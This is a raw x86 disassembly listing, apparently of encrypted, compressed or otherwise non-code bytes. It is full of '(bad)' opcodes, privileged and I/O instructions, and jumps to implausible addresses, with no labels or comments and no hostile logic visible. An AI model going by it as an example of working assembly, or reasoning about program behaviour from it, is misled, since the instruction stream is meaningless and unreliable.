  40491c:	sbb    eax,0xcf3d8e10
  404921:	(bad)  
  404922:	lock dec edx
  404924:	dec    ebx
  404925:	mov    ecx,0xc616ed84
  40492a:	lahf   
  40492b:	outs   dx,BYTE PTR ds:[esi]
  40492c:	or     ebx,ebx
  40492e:	or     esi,DWORD PTR [ebx+edx*2-0x1cf252e8]
  404935:	je     0x404934
  404937:	cwde   
  404938:	push   0x5b
  40493a:	loopne 0x404969
  40493c:	je     0x4048d4
  40493e:	popa   
  40493f:	clc    
  404940:	dec    edx
  404941:	lahf   
  404942:	mov    edi,0xe2bc7909
  404947:	jmp    0x404996
  404949:	push   cs
  40494a:	in     eax,dx
  40494b:	(bad)  
  40494c:	aam    0x7
  40494e:	mov    BYTE PTR [ecx-0x392a9f41],ah
  404954:	add    BYTE PTR [esi-0x74310235],0xc3
  40495b:	xor    edx,DWORD PTR [ebp-0x777fa8a1]
  404961:	fisubr DWORD PTR ds:[eax+ecx*2]
  404965:	mov    ah,ch
  404967:	jno    0x40496c
  404969:	hlt    
  40496a:	inc    edi
  40496b:	add    bh,BYTE PTR [esi]
  40496d:	into   
  40496e:	rol    DWORD PTR [eax-0x63605d4b],0x7e
  404975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404976:	xlat   BYTE PTR ds:[ebx]
  404977:	push   eax
  404978:	xlat   BYTE PTR ds:[ebx]
  404979:	out    0xe3,eax
  40497b:	mov    esi,0x83f37a1
  404980:	jmp    0x404977
  404982:	shr    DWORD PTR [ebp-0x56],cl
  404985:	lock and BYTE PTR [ebp+0x55],al
  404989:	sub    BYTE PTR [esp+edi*1-0x729d662],ch
  404990:	fcomip st,st(7)
  404992:	push   ds
  404993:	(bad)  
  404994:	pop    esi
  404995:	popa   
  404996:	push   0x9e15b53c
  40499b:	std    
  40499c:	xchg   esi,eax
  40499d:	shl    bl,1
  40499f:	jl     0x40499f
  4049a1:	scas   eax,DWORD PTR es:[edi]
  4049a2:	jns    0x4049ed
  4049a4:	iret   
  4049a5:	mov    ds:0x784e47a5,al
  4049aa:	mov    WORD PTR [ebp+0x410801d1],cs
  4049b0:	outs   dx,BYTE PTR ds:[esi]
  4049b1:	xor    al,0x62
  4049b3:	mov    al,0xb7
  4049b5:	xchg   esp,eax
  4049b6:	fsubr  DWORD PTR [edi]
  4049b8:	add    bl,BYTE PTR [esi]
  4049ba:	jnp    0x4049f2
  4049bc:	jnp    0x4049c8
  4049be:	iret   
  4049bf:	jg     0x4049e7
  4049c1:	mov    ebx,edx
  4049c3:	xchg   edx,eax
  4049c4:	test   DWORD PTR [eax+0x3f],ecx
  4049c7:	pop    edx
  4049c8:	cmp    DWORD PTR [ecx+0x687e1d17],0x83e1865
  4049d2:	sbb    eax,0xf7bb5c3c
  4049d7:	inc    DWORD PTR [ebp-0x30]
  4049da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049db:	lea    edi,[edi]
  4049dd:	xor    ah,cl
  4049df:	mov    eax,0x8d637910
  4049e4:	cmp    eax,0xb973474
  4049e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049eb:	lea    edx,[ebx+0x2b]
  4049ee:	aam    0xce
  4049f0:	bound  edx,QWORD PTR es:[ebp-0x28]
  4049f4:	ins    BYTE PTR es:[edi],dx
  4049f5:	ret    
  4049f6:	test   al,0x3f
  4049f8:	push   0xfffffff0
  4049fa:	arpl   WORD PTR [edi],ax
  4049fc:	or     BYTE PTR [eax],dh
  4049fe:	xor    BYTE PTR [ecx+edi*4+0x72],0x50
  404a03:	dec    esi
  404a04:	adc    ah,BYTE PTR [edx+0x5d8afce0]
  404a0a:	add    bl,BYTE PTR [ebp-0x79]
  404a0d:	rcr    DWORD PTR [edx],1
  404a0f:	add    DWORD PTR [eax+0x3284c8a],ebp
  404a15:	xchg   edi,eax
  404a16:	cs pop edx
  404a18:	xor    al,0xad
  404a1a:	jne    0x404a07
  404a1c:	fnsave [edi]
  404a1e:	adc    eax,0xeee062db
  404a23:	xchg   ebx,eax
  404a24:	sbb    ch,al
  404a26:	push   ecx
  404a27:	sub    DWORD PTR [edi-0x62],esp
  404a2a:	scas   eax,DWORD PTR es:[edi]
  404a2b:	shl    DWORD PTR [esi+0x7a],cl
  404a2e:	es cld 
  404a30:	bound  ecx,QWORD PTR [edx]
  404a32:	out    0x1b,eax
  404a34:	stos   DWORD PTR es:[edi],eax
  404a35:	aam    0xf2
  404a37:	test   DWORD PTR [ebx+edx*8-0x57157fb2],ebp
  404a3e:	jbe    0x4049db
  404a40:	cli    
  404a41:	ins    DWORD PTR es:[edi],dx
  404a42:	sub    eax,eax
  404a44:	fwait
  404a45:	xchg   ebp,eax
  404a46:	test   eax,0x85a8dc6d
  404a4b:	fdiv   DWORD PTR [eax+0x5d]
  404a4e:	push   ebx
  404a4f:	retf   0xa7fe
  404a52:	add    dh,0xab
  404a55:	ins    BYTE PTR es:[edi],dx
  404a56:	mov    esp,0x7bd7e75f
  404a5b:	gs (bad) 
  404a5d:	jge    0x404ad9
  404a5f:	fistp  QWORD PTR [eax+0x35]
  404a62:	mov    ecx,0x36222b5a
  404a67:	mov    ecx,0x9309cda9
  404a6c:	push   eax
  404a6d:	in     al,0x37
  404a6f:	mov    dl,0x4f
  404a71:	mov    al,0x11
  404a73:	sub    bh,BYTE PTR [esi+0x46]
  404a76:	push   ds
  404a77:	daa    
  404a78:	in     eax,0x92
  404a7a:	pop    ebx
  404a7b:	xchg   DWORD PTR [edx],edx
  404a7d:	cli    
  404a7e:	frstpm(287 only) 
  404a80:	mov    ch,0x98
  404a82:	sub    DWORD PTR [edx+0x58],eax
  404a85:	dec    edi
  404a86:	mov    bl,0xc1
  404a88:	data16 adc al,0xb5
  404a8b:	xor    DWORD PTR [esi+0x68],esi
  404a8e:	lock jp 0x404a45
  404a91:	int    0x28
  404a93:	xchg   DWORD PTR [edi],esi
  404a95:	in     al,0x8f
  404a97:	cmc    
  404a98:	lods   eax,DWORD PTR ds:[esi]
  404a99:	fldcw  WORD PTR [ebp-0x1f4a6991]
  404a9f:	ins    BYTE PTR es:[edi],dx
  404aa0:	or     esp,DWORD PTR [eax+esi*8+0x1c]
  404aa4:	push   edi
  404aa5:	add    BYTE PTR [edx-0x38d56bba],dl
  404aab:	push   0xffffffcc
  404aad:	pop    edx
  404aae:	cli    
  404aaf:	xor    ecx,DWORD PTR [esi-0x310d1d69]
  404ab5:	or     DWORD PTR [edx-0x21],edx
  404ab8:	push   ss
  404ab9:	rcl    DWORD PTR [esi+0x59],1
  404abc:	adc    esp,ebp
  404abe:	test   al,0x7d
  404ac0:	outs   dx,BYTE PTR ss:[esi]
  404ac2:	ror    BYTE PTR [edx],1
  404ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac5:	(bad)  
  404ac6:	(bad)  
  404ac7:	lods   al,BYTE PTR ds:[esi]
  404ac8:	mov    ah,0x1d
  404aca:	shl    BYTE PTR [eax+eiz*4],0xbb
  404ace:	pop    eax
  404acf:	jmp    0x6472423d
  404ad4:	sbb    ecx,DWORD PTR [ebp-0x54]
  404ad7:	mov    eax,ds:0xace5595d
  404adc:	ss xor eax,0x1a0d81fc
  404ae2:	sbb    BYTE PTR es:[ecx+0x8fa9d03],bl
  404ae9:	push   ecx
  404aea:	not    BYTE PTR [ecx+0x24]
  404aed:	jle    0x404a93
  404aef:	and    DWORD PTR ds:0x6bebebcb,edi
  404af5:	dec    ecx
  404af6:	lahf   
  404af7:	mov    ecx,0xfccd0184
  404afc:	jg     0x404b16
  404afe:	xchg   BYTE PTR [ebx+0x74],dl
  404b01:	cmp    eax,0x1640fd7c
  404b06:	sar    DWORD PTR [edi],cl
  404b08:	mov    ds:0x14619bb7,eax
  404b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b0e:	push   edi
  404b0f:	pop    ebx
  404b10:	mov    ds:0xd17a4fbc,eax
  404b15:	jb     0x404ae1
  404b17:	repnz aas 
  404b19:	mov    eax,0xc03d75db
  404b1e:	scas   al,BYTE PTR es:[edi]
  404b1f:	jnp    0x404b9d
  404b21:	xor    eax,0x2948c9e
  404b26:	mov    DWORD PTR [ecx+ecx*2+0x128eff8d],esi
  404b2d:	mov    ecx,ecx
  404b2f:	inc    ebx
  404b30:	mov    ah,0xf6
  404b32:	call   0x51eee2e1
  404b37:	mov    dl,BYTE PTR [edx+0x5c71e785]
  404b3d:	fst    QWORD PTR [edi-0x7e]
  404b40:	mov    edx,0x8b34ae53
  404b45:	xor    ch,BYTE PTR [esp+eax*2]
  404b48:	mov    ebx,0xaa0abc9a
  404b4d:	sbb    ebp,DWORD PTR ds:[ecx+0x40]
  404b51:	das    
  404b52:	sub    ch,BYTE PTR [edx-0x69aa6d0f]
  404b58:	sbb    ah,ah
  404b5a:	pop    esp
  404b5b:	sbb    edi,ebx
  404b5d:	xchg   edx,eax
  404b5e:	pop    ebx
  404b5f:	inc    ecx
  404b60:	xor    al,0x47
  404b62:	xor    al,0xf0
  404b64:	add    esi,DWORD PTR [edx+0x7afd3170]
  404b6a:	jecxz  0x404bb4
  404b6c:	ret    0x69a7
  404b6f:	fsubr  DWORD PTR [ebp+0x12]
  404b72:	jns    0x404b45
  404b74:	jmp    0x51ee580c
  404b79:	sub    edi,DWORD PTR [eax+0x303b4f5c]
  404b7f:	sbb    eax,edi
  404b81:	stos   DWORD PTR es:[edi],eax
  404b82:	sub    DWORD PTR [edx],0xffffffaf
  404b85:	sub    al,0x85
  404b87:	or     eax,0x9a111182
  404b8c:	imul   esi,DWORD PTR fs:[edi-0x14],0xffffffaa
  404b91:	in     al,0xdb
  404b93:	push   eax
  404b94:	les    esi,FWORD PTR es:[edi+ebx*2]
  404b98:	rcl    BYTE PTR [ecx],1
  404b9a:	inc    ecx
  404b9b:	xor    eax,0xfb2e1b57
  404ba0:	ret    
  404ba1:	adc    DWORD PTR [ebx-0x4],edi
  404ba4:	dec    eax
  404ba5:	dec    edx
  404ba6:	das    
  404ba7:	dec    DWORD PTR [eax]
  404ba9:	dec    ecx
  404baa:	mov    ch,0x9c
  404bac:	or     DWORD PTR [esi+esi*2+0x7b5fc158],eax
  404bb3:	sub    eax,0xb6eea21d
  404bb8:	mov    ecx,0xe9e1c2c3
  404bbd:	ins    DWORD PTR es:[edi],dx
  404bbe:	lds    esp,FWORD PTR [esi-0x74]
  404bc1:	xor    BYTE PTR ss:[edx+0x566f1154],0x9e
  404bc9:	rcr    DWORD PTR [edi],1
  404bcb:	(bad)  
  404bcd:	test   BYTE PTR [edi+0x7e596d84],0xc7
  404bd4:	sti    
  404bd5:	push   esp
  404bd6:	mov    DWORD PTR [ecx],ebp
  404bd8:	enter  0x75de,0xa8
  404bdc:	repnz aad 0x5a
  404bdf:	addr16 sbb eax,0x4bdf02d9
  404be5:	xor    cl,BYTE PTR [esi-0x51]
  404be8:	sub    al,0x8d
  404bea:	pop    ds
  404beb:	test   DWORD PTR [eax-0x4e],ebx
  404bee:	fistp  QWORD PTR [eax]
  404bf0:	(bad)  
  404bf1:	les    ecx,FWORD PTR [edx-0x68e183f8]
  404bf7:	jle    0x404c58
  404bf9:	adc    ecx,ebp
  404bfb:	lods   eax,DWORD PTR ds:[esi]
  404bfc:	fs and al,0x91
  404bff:	out    dx,al
  404c00:	xchg   edx,eax
  404c01:	add    eax,0xc8d6ae87
  404c06:	pop    fs
  404c08:	ror    DWORD PTR [edi+0x62e1aa3f],0xb7
  404c0f:	jle    0x404c3c
  404c11:	jp     0x404c64
  404c13:	fidivr WORD PTR [eax-0x3e]
  404c16:	dec    esp
  404c17:	mul    esp
  404c19:	stos   DWORD PTR es:[edi],eax
  404c1a:	jne    0x404c1f
  404c1c:	cli    
  404c1d:	push   0x2f0b62d2
  404c22:	xlat   BYTE PTR ds:[ebx]
  404c23:	dec    edx
  404c24:	push   cs
  404c25:	adc    eax,0x94cad86b
  404c2a:	shl    cl,cl
  404c2c:	(bad)  
  404c2e:	je     0x404c7e
  404c30:	sub    esp,DWORD PTR [esi+0x77]
  404c33:	sub    al,0x40
  404c35:	xchg   ebx,eax
  404c36:	bound  edx,QWORD PTR [eax+0x13]
  404c39:	add    BYTE PTR [ebx],ch
  404c3b:	in     al,dx
  404c3c:	and    al,0x7a
  404c3e:	xor    eax,0x44b38ff5
  404c43:	jb     0x404c20
  404c45:	inc    esp
  404c46:	xchg   esi,eax
  404c47:	cwde   
  404c48:	not    DWORD PTR [esi+0x1]
  404c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c4c:	fiadd  DWORD PTR [edi]
  404c4e:	(bad)  
  404c4f:	out    0xf7,eax
  404c51:	shl    BYTE PTR [ebx+0x6d],1
  404c54:	xor    eax,0x1b3e8c32
  404c59:	push   0x61
  404c5b:	pusha  
  404c5c:	sti    
  404c5d:	sbb    eax,0x3ce80b63
  404c62:	sahf   
  404c63:	push   ebp
  404c64:	daa    
  404c65:	add    ah,dl
  404c67:	mov    dh,0xde
  404c69:	(bad)  
  404c6a:	pop    ss
  404c6b:	jns    0x404c4c
  404c6d:	out    0xb8,eax
  404c6f:	enter  0x7dfd,0x2d
  404c73:	or     ebp,DWORD PTR [ebx]
  404c75:	add    al,bl
  404c77:	xchg   ebp,eax
  404c78:	and    ch,dl
  404c7a:	out    0xdc,al
  404c7c:	jecxz  0x404c25
  404c7e:	cwde   
  404c7f:	aas    
  404c80:	enter  0x811e,0x11
  404c84:	and    al,0x95
  404c86:	mov    edx,0x8f5ebaf0
  404c8b:	loopne 0x404c3f
  404c8d:	data16 (bad) [edx-0xf2b4cd8]
  404c94:	mov    bh,0xdb
  404c96:	ds popf 
  404c98:	jns    0x404c64
  404c9a:	pop    ecx
  404c9b:	push   edx
  404c9c:	or     ch,BYTE PTR [edx-0x823fa57]
  404ca2:	and    al,BYTE PTR [edi]
  404ca4:	jp     0x404c92
  404ca6:	cmp    eax,DWORD PTR [eax+0x2de19efd]
  404cac:	push   ebx
  404cad:	fsub   DWORD PTR [edx]
  404caf:	rcr    cl,0xf2
  404cb2:	aad    0x74
  404cb4:	push   eax
  404cb5:	cdq    
  404cb6:	popa   
  404cb7:	sahf   
  404cb8:	xor    ebp,DWORD PTR [edi+edx*8+0xc15c183]
  404cbf:	retf   
  404cc0:	out    dx,al
  404cc1:	pop    ebx
  404cc2:	cli    
  404cc3:	(bad)  [ecx-0x470de2a6]
  404cc9:	ss stc 
  404ccb:	mov    esi,0x93720c8f
  404cd0:	enter  0x2a07,0xdc
  404cd4:	cmp    bl,BYTE PTR [ebx+0x476ed3e3]
  404cda:	outs   dx,DWORD PTR ds:[esi]
  404cdb:	push   0x589f25b8
  404ce0:	add    eax,0xac0d8af2
  404ce5:	popf   
  404ce6:	aad    0x60
  404ce8:	(bad)  
  404ce9:	adc    ah,BYTE PTR [ebx+0x58]
  404cec:	jne    0x404c79
  404cee:	cs dec ebx
  404cf0:	jmp    0x404d09
  404cf2:	dec    ecx
  404cf3:	adc    BYTE PTR [esi],ah
  404cf5:	mov    ebp,0x8ea335a9
  404cfa:	push   cs
  404cfb:	fdivp  st(5),st
  404cfd:	imul   BYTE PTR [edx-0x26]
  404d00:	jle    0x404ce8
  404d02:	sbb    eax,0x1596f671
  404d07:	je     0x404d34
  404d09:	inc    ecx
  404d0a:	sub    ah,BYTE PTR [ebx-0x60]
  404d0d:	xor    ecx,eax
  404d0f:	ret    0x34f4
  404d12:	imul   BYTE PTR [edx+0x627e85b1]
  404d18:	push   ss
  404d19:	ror    ah,cl
  404d1b:	add    al,0xe3
  404d1d:	arpl   WORD PTR [esi+ebp*4-0x29],cx
  404d21:	push   DWORD PTR ds:0xcd8115fc
  404d27:	fldcw  WORD PTR [ebx-0x7c]
  404d2a:	sub    DWORD PTR [ecx],esp
  404d2c:	pop    esp
  404d2d:	out    0xba,al
  404d2f:	(bad)  
  404d30:	xchg   ebp,eax
  404d31:	mov    eax,0x74000c25
  404d36:	pop    ss
  404d37:	push   0xece064e5
  404d3c:	or     edi,0x6a
  404d3f:	push   edx
  404d40:	mov    al,0xf1
  404d42:	mov    cl,0x30
  404d44:	jo     0x404cc6
  404d46:	pop    es
  404d47:	(bad)  
  404d48:	jne    0x404d45
  404d4a:	loop   0x404d13
  404d4c:	mov    al,ds:0xcfbf799a
  404d51:	push   ss
  404d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d53:	mov    ah,0x61
  404d55:	and    ebx,DWORD PTR [ebx+0x2b]
  404d58:	jb     0x404d25
  404d5a:	mov    ah,0xd7
  404d5c:	xor    dl,al
  404d5e:	sti    
  404d5f:	pushf  
  404d60:	fild   WORD PTR [edi-0x4ef7b428]
  404d66:	into   
  404d67:	mov    dh,0xe2
  404d69:	addr16 popf 
  404d6b:	xor    al,0xaa
  404d6d:	sbb    eax,0xdea26876
  404d72:	xchg   ebx,eax
  404d73:	mov    ch,BYTE PTR [ebx+0x5f01fc79]
  404d79:	sbb    DWORD PTR [esi-0x37],ebp
  404d7c:	cmp    al,al
  404d7e:	push   ss
  404d7f:	cmp    WORD PTR [edi],cx
  404d82:	ror    ecx,cl
  404d84:	push   edi
  404d85:	outs   dx,BYTE PTR ds:[esi]
  404d86:	add    edi,DWORD PTR [ecx]
  404d88:	cmp    ecx,DWORD PTR [ebx]
  404d8a:	push   eax
  404d8b:	xor    BYTE PTR [ebx-0x3a01875a],ah
  404d91:	pop    ss
  404d92:	pop    ds
  404d93:	pop    edx
  404d94:	or     edi,edx
  404d96:	(bad)  
  404d98:	jo     0x404d2b
  404d9a:	xchg   edx,eax
  404d9b:	adc    DWORD PTR [ebp+0xa6d5bd7],0x2ba9b126
  404da5:	jmp    FWORD PTR [ecx-0x11]
  404da8:	pop    ss
  404da9:	(bad)  
  404daa:	stos   BYTE PTR es:[edi],al
  404dab:	add    ebx,DWORD PTR [ebx+0x3]
  404dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404daf:	jne    0x404dd5
  404db1:	or     DWORD PTR [esi+eiz*2-0x4c],edx
  404db5:	mov    esp,esi
  404db7:	test   eax,0x87c4742
  404dbc:	dec    ebp
  404dbd:	dec    edx
  404dbe:	add    al,0x4b
  404dc0:	shl    DWORD PTR [edi],0x34
  404dc3:	mov    esp,0x24a7b8e1
  404dc8:	retf   0xddf
  404dcb:	ret    0x9d9b
  404dce:	jne    0x404dad
  404dd0:	clc    
  404dd1:	xor    eax,0x1748904b
  404dd6:	mov    al,0x41
  404dd8:	es pusha 
  404dda:	mov    ds:0x1a76742,eax
  404ddf:	in     al,0x67
  404de1:	sub    bh,bl
  404de3:	dec    esp
  404de4:	mov    al,ds:0xb11b54c
  404de9:	push   esi
  404dea:	and    DWORD PTR [edi],ebx
  404dec:	inc    esi
  404ded:	(bad)  
  404dee:	data16 add BYTE PTR [eax+0x50e6c26d],bl
  404df5:	push   ebx
  404df6:	cmp    eax,DWORD PTR [eax-0x267137ad]
  404dfc:	dec    ecx
  404dfd:	jns    0x404d9f
  404dff:	xchg   DWORD PTR [ebx],eax
  404e01:	fnstenv [ebx-0x1c63ea36]
  404e07:	xchg   edi,eax
  404e08:	or     edi,ecx
  404e0a:	xchg   dh,bh
  404e0c:	stos   BYTE PTR es:[edi],al
  404e0d:	add    DWORD PTR [edx],ecx
  404e0f:	push   DWORD PTR [ecx]
  404e11:	es enter 0x8e83,0x23
  404e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e17:	ficom  DWORD PTR [eax+eiz*8-0x80]
  404e1b:	enter  0xba88,0x81
  404e1f:	inc    eax
  404e20:	loope  0x404e0d
  404e22:	int    0x6d
  404e24:	test   DWORD PTR [esi+0x819910c],0x1581ddbe
  404e2e:	jns    0x404e96
  404e30:	loope  0x404e95
  404e32:	pop    ecx
  404e33:	in     al,0xb8
  404e35:	xchg   ebp,eax
  404e36:	push   ebp
  404e37:	jp     0x404e49
  404e39:	xor    DWORD PTR [ecx-0x46],ebx
  404e3c:	retf   
  404e3d:	scas   al,BYTE PTR es:[edi]
  404e3e:	clc    
  404e3f:	in     al,0x87
  404e41:	in     al,dx
  404e42:	retf   0xe1a1
  404e45:	sbb    eax,0x857647bf
  404e4a:	push   ebp
  404e4b:	and    BYTE PTR [edi],al
  404e4d:	inc    ecx
  404e4e:	stos   DWORD PTR es:[edi],eax
  404e4f:	dec    edi
  404e50:	aas    
  404e51:	test   al,0xd4
  404e53:	push   es
  404e54:	xor    DWORD PTR [ebx],esi
  404e56:	es sbb eax,esp
  404e59:	stos   DWORD PTR es:[edi],eax
  404e5a:	jl     0x404e9a
  404e5c:	lds    eax,FWORD PTR [ebx]
  404e5e:	sbb    ecx,DWORD PTR [ebx-0x34]
  404e61:	inc    eax
  404e62:	and    al,0x79
  404e64:	fmul   st,st(7)
  404e66:	(bad)  
  404e67:	loop   0x404df4
  404e69:	iret   
  404e6a:	fdivr  QWORD PTR [esi-0x7d]
  404e6d:	imul   ebx
  404e6f:	mov    bh,ah
  404e71:	mov    esp,0xfd1e903c
  404e76:	push   ecx
  404e77:	and    eax,0x620ecc37
  404e7c:	lods   eax,DWORD PTR ds:[esi]
  404e7d:	push   eax
  404e7e:	pop    esi
  404e7f:	mov    ebp,0x77a40bf4
  404e84:	(bad)  
  404e85:	push   esi
  404e86:	fscale 
  404e88:	scas   eax,DWORD PTR es:[edi]
  404e89:	mov    dl,0xac
  404e8c:	cmp    DWORD PTR [ecx+0x59b3ce6e],ebx
  404e92:	es mov ch,0xba
  404e95:	cmp    BYTE PTR [edi],bl
  404e97:	mov    eax,ds:0xb9741a1f
  404e9c:	aaa    
  404e9d:	ficomp WORD PTR [ebp-0x67]
  404ea0:	mov    ecx,DWORD PTR [ebp+0x3e1d8f64]
  404ea6:	popf   
  404ea7:	mov    al,ds:0xe51fdc4f
  404eac:	dec    edi
  404ead:	jmp    0x404e77
  404eaf:	inc    edi
  404eb0:	pop    edx
  404eb1:	fwait
  404eb2:	xchg   edx,eax
  404eb3:	add    al,0xa8
  404eb5:	sbb    edi,DWORD PTR [esi-0x25]
  404eb8:	lock jmp edi
  404ebb:	cld    
  404ebc:	or     ah,dh
  404ebe:	xchg   edi,eax
  404ebf:	addr16 pop esp
  404ec1:	ins    DWORD PTR es:[edi],dx
  404ec2:	sbb    ch,bh
  404ec4:	or     DWORD PTR [esi-0xdd4b446],esi
  404eca:	inc    ebx
  404ecb:	popf   
  404ecc:	ret    
  404ecd:	je     0x404eb4
  404ecf:	mov    eax,0x78e1e0c8
  404ed4:	sub    eax,0x6ea27333
  404ed9:	clc    
  404eda:	bswap  ecx
  404edc:	xor    BYTE PTR [ecx+0x2d],bh
  404edf:	les    ebx,FWORD PTR [ecx-0x7b]
  404ee2:	fnstcw WORD PTR [ebx-0x39]
  404ee5:	push   ebx
  404ee6:	mov    DWORD PTR [esi+0x44],0x4423eb89
  404eed:	fldcw  WORD PTR [edx]
  404eef:	mov    ebx,0x3a8fe064
  404ef4:	cmp    al,0x1
  404ef6:	cmp    eax,0x8e7be2ac
  404efb:	test   eax,0xca86278
  404f00:	bound  bp,DWORD PTR es:0x20dd7a7e
  404f08:	push   ecx
  404f09:	(bad)  
  404f0a:	dec    edi
  404f0b:	jecxz  0x404ec9
  404f0d:	ds stos DWORD PTR es:[edi],eax
  404f0f:	loope  0x404f2f
  404f11:	rcr    DWORD PTR [esi],cl
  404f13:	ss adc eax,0x3ca63acf
  404f19:	mov    ch,0x9d
  404f1b:	jne    0x404f52
  404f1d:	call   0x413dcf58
  404f22:	or     dh,ch
  404f24:	(bad)
  404f28:	out    0x83,eax
  404f2a:	pop    es
  404f2b:	dec    esi
  404f2c:	bound  ebp,QWORD PTR [ebp-0x3e]
  404f2f:	call   0xe7e7fb4a
  404f34:	cmp    eax,0x718d6907
  404f39:	mul    DWORD PTR [edx-0x36]
  404f3c:	xlat   BYTE PTR ds:[ebx]
  404f3d:	add    dl,BYTE PTR [eax]
  404f3f:	dec    ecx
  404f40:	sub    eax,esp
  404f42:	jge    0x404fb7
  404f44:	test   eax,0x598ab2ce
  404f49:	scas   eax,DWORD PTR es:[edi]
  404f4a:	xchg   esp,eax
  404f4b:	lds    ecx,FWORD PTR [ebx+0x73]
  404f4e:	ja     0x404f9b
  404f50:	xchg   edi,eax
  404f51:	pop    edx
  404f52:	cmp    al,0x84
  404f54:	jle    0x404ed7
  404f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f57:	aad    0xec
  404f59:	xlat   BYTE PTR es:[ebx]
  404f5b:	sbb    BYTE PTR [edx-0x29f3843],dl
  404f61:	and    BYTE PTR [esi],ch
  404f63:	jo     0x404f6f
  404f65:	jo     0x404f79
  404f67:	mov    ds:0x605c039c,eax
  404f6c:	nop
  404f6d:	push   edi
  404f6e:	mov    edi,0xbc04f0d6
  404f73:	mov    esp,0xe19e914a
  404f78:	aad    0x40
  404f7a:	repnz gs es or al,0x59
  404f7f:	mov    edi,0x94fa6798
  404f84:	fwait
  404f85:	aam    0x6f
  404f87:	fdivrp st(7),st
  404f89:	pop    ss
  404f8a:	mov    ecx,0x475398c4
  404f8f:	ss stc 
  404f91:	mov    edi,0x7e364e08
  404f96:	xchg   ecx,eax
  404f97:	jg     0x404fea
  404f99:	jbe    0x404f85
  404f9b:	adc    ebp,esi
  404f9d:	(bad)  
  404f9e:	adc    DWORD PTR [ebp+0x6],esi
  404fa1:	mov    ch,0xf6
  404fa3:	pop    ds
  404fa4:	push   ebx
  404fa5:	mov    ds:0x3232a341,eax
  404faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fab:	mov    dh,0xa3
  404fad:	ror    BYTE PTR [ebp+0x2d],cl
  404fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb1:	push   0x67
  404fb3:	enter  0x1de4,0xe8
  404fb7:	outs   dx,DWORD PTR ds:[esi]
  404fb8:	and    DWORD PTR [eax+0x545e7bc],edx
  404fbe:	mov    al,0x95
  404fc0:	call   0xaf7b:0xca3a0231
  404fc7:	(bad)  
  404fc8:	sbb    eax,0xef5e4d9f
  404fcd:	and    esi,DWORD PTR [edi+edx*8+0x7c]
  404fd1:	sub    DWORD PTR [ebx+0x11],ebx
  404fd4:	fldenv [esi+edi*8+0x7c]
  404fd8:	sub    DWORD PTR [edx+ebx*1],ecx
  404fdb:	add    eax,DWORD PTR [ebx+0x67]
  404fde:	inc    edx
  404fdf:	pop    edi
  404fe0:	lahf   
  404fe1:	push   ebp
  404fe2:	dec    esi
  404fe3:	adc    DWORD PTR [ebp+0x5e],eax
  404fe6:	mul    BYTE PTR [edx]
  404fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe9:	push   esi
  404fea:	and    DWORD PTR [esi-0x6],esi
  404fed:	js     0x404f70
  404fef:	sub    al,0xe3
  404ff1:	push   esp
  404ff2:	mov    dh,0xd0
  404ff4:	add    eax,0x9921bcff
  404ff9:	clc    
  404ffa:	rol    BYTE PTR [eax],cl
  404ffc:	mov    ebx,0x7fc5496e
  405001:	pop    ss
  405002:	test   DWORD PTR [edi+0x37],esi
  405005:	pop    es
  405006:	add    BYTE PTR [ebp-0x12d3edef],bh
  40500c:	sub    eax,0x3a775bf
  405011:	std    
  405012:	rcl    DWORD PTR [ecx+0x3077cbb],1
  405018:	retf   
  405019:	(bad)  
  40501a:	jns    0x404fc3
  40501c:	jnp    0x405029
  40501e:	or     al,0xf0
  405020:	mov    edx,0x1e4bed0c
  405025:	scas   al,BYTE PTR es:[edi]
  405026:	stos   DWORD PTR es:[edi],eax
  405027:	sahf   
  405028:	nop
  405029:	cdq    
  40502a:	sysexit 
  40502c:	icebp  
  40502d:	dec    esp
  40502e:	(bad)  
  40502f:	fucomi st,st(7)
  405031:	imul   edi,DWORD PTR [edi-0x11a599ea],0x1e
  405038:	inc    edi
  405039:	mov    dh,0xe5
  40503b:	(bad)  
  40503c:	js     0x405020
  40503e:	lds    ebp,FWORD PTR [esi]
  405040:	cmp    BYTE PTR [eax+0x73cdb26d],dl
  405046:	data16 mov cl,0x96
  405049:	adc    al,0xe1
  40504b:	pop    ds
  40504c:	xchg   esi,eax
  40504d:	mov    dh,0x8a
  40504f:	(bad)  
  405050:	mov    WORD PTR [eax],?
  405052:	imul   esi
  405054:	mov    al,ds:0x5c4d2b7e
  405059:	or     DWORD PTR [esi-0x3e],0x33
  40505d:	arpl   WORD PTR fs:[esi-0x1],ax
  405061:	cld    
  405062:	push   ss
  405063:	inc    edi
  405064:	xchg   ebp,eax
  405065:	out    dx,eax
  405066:	sbb    eax,0xb7f32c66
  40506b:	repz push ss
  40506d:	adc    eax,0xe2070fb9
  405072:	push   ebx
  405073:	into   
  405074:	mov    bl,0x39
  405076:	cdq    
  405077:	dec    ecx
  405078:	xlat   BYTE PTR ds:[ebx]
  405079:	jo     0x40506b
  40507b:	sub    al,0x31
  40507d:	mov    esi,0xdba0b5ef
  405082:	inc    edi
  405083:	fsubr  QWORD PTR [esi+0x5f]
  405086:	xchg   ecx,eax
  405087:	mov    edx,DWORD PTR [eax+0x38]
  40508a:	mov    eax,ds:0x5cef2b92
  40508f:	mov    edi,0x4f4151e5
  405094:	mov    BYTE PTR [edx+0x72b33cb2],dh
  40509a:	cmp    BYTE PTR [ebx+ebx*4-0x779d863f],cl
  4050a1:	iret   
  4050a2:	call   0x53eebd3d
  4050a7:	es xchg edi,esi
  4050aa:	mov    esi,edx
  4050ac:	pop    ss
  4050ad:	shl    esi,0xd8
  4050b0:	shufps xmm2,XMMWORD PTR [esi-0x3f],0x9a
  4050b5:	fcomip st,st(2)
  4050b7:	xor    eax,0xf3e9cf3b
